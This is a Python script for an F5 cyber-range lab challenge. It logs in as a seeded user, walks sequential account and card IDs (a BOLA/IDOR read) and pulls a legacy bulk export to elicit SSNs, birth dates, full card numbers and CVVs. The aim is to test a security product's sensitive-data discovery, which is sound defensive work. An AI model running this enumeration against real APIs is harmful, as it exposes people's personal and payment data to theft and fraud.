"""
sensitive_data_probe.py — hit endpoints that RETURN sensitive data in responses.

F5 ADSP Cyber Range challenge:
    #7 Sensitive-data exposure — responses that carry SSN, full PAN+CVV, DOB,
       email, so XC data-discovery/masking has something to find.
XC signal produced:
    Sensitive Data Discovery / masking. XC inspects RESPONSE bodies and should
    classify these fields (SSN, PAN, CVV, DOB) as sensitive and offer to mask
    them. The attack just elicits the data so there is something in the
    response for discovery to catch.

Three response sinks are read:
    GET /api/accounts/accounts/{1..N}   -> ssn_full, date_of_birth (BOLA read)
    GET /api/cards/cards/{1..N}          -> full card_number (PAN) + cvv
    GET /api/accounts/legacy/export      -> the shadow dump of every account+SSN

Prints a truncated sample proving PII came back; full values are left in the
responses (nothing is written to disk by default).

Usage:
    python3 sensitive_data_probe.py
    python3 sensitive_data_probe.py --max-id 5 --user bob
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import BASE_URL, SEEDED_USERS, auth_headers, login, make_client


def mask_ssn(ssn):
    ssn = str(ssn or "")
    return ("***-**-" + ssn[-4:]) if len(ssn) >= 4 else ssn


def mask_pan(pan):
    pan = str(pan or "")
    return ("*" * max(0, len(pan) - 4) + pan[-4:]) if len(pan) >= 4 else pan


def main():
    ap = argparse.ArgumentParser(description="Sensitive-data response probe.")
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS))
    ap.add_argument("--max-id", type=int, default=4)
    args = ap.parse_args()

    creds = SEEDED_USERS[args.user]
    print(f"Target: {BASE_URL}  (as {args.user})")
    print("lab-only — eliciting PII in responses for XC data-discovery/masking\n")

    found = {"ssn": 0, "pan": 0, "cvv": 0}
    with make_client() as client:
        token, _ = login(client, creds["email"], creds["password"])
        hdrs = auth_headers(token)

        print("--- GET /api/accounts/accounts/{id}  (ssn_full, date_of_birth) ---")
        for i in range(1, args.max_id + 1):
            r = client.get(f"/api/accounts/accounts/{i}", headers=hdrs)
            if r.status_code == 200:
                a = r.json()
                if a.get("ssn_full"):
                    found["ssn"] += 1
                print(f"  acct {i}: ssn={mask_ssn(a.get('ssn_full'))}  "
                      f"dob={a.get('date_of_birth')}  acct#={a.get('account_number')}")

        print("\n--- GET /api/cards/cards/{id}  (full PAN + CVV) ---")
        for i in range(1, args.max_id + 1):
            r = client.get(f"/api/cards/cards/{i}", headers=hdrs)
            if r.status_code == 200:
                c = r.json()
                if c.get("card_number"):
                    found["pan"] += 1
                if c.get("cvv"):
                    found["cvv"] += 1
                print(f"  card {i}: pan={mask_pan(c.get('card_number'))}  "
                      f"cvv={'***' if c.get('cvv') else '-'}(len={len(str(c.get('cvv') or ''))})  "
                      f"exp={c.get('expiry')}")

        print("\n--- GET /api/accounts/legacy/export  (shadow dump, every SSN) ---")
        r = client.get("/api/accounts/legacy/export", headers=hdrs)
        legacy_n = 0
        if r.status_code == 200:
            rows = r.json()
            legacy_n = len(rows)
            for a in rows[:3]:
                print(f"  acct {a.get('id')}: ssn={mask_ssn(a.get('ssn_full'))}  "
                      f"dob={a.get('date_of_birth')}")

    print("\n--- report ---")
    print(f"sensitive fields observed in responses: "
          f"SSNs={found['ssn']}, PANs={found['pan']}, CVVs={found['cvv']}, "
          f"legacy/export rows={legacy_n}")
    print("(console values are MASKED; the raw responses carried them in full — "
          "which is what XC sensitive-data discovery should flag.)")


if __name__ == "__main__":
    main()
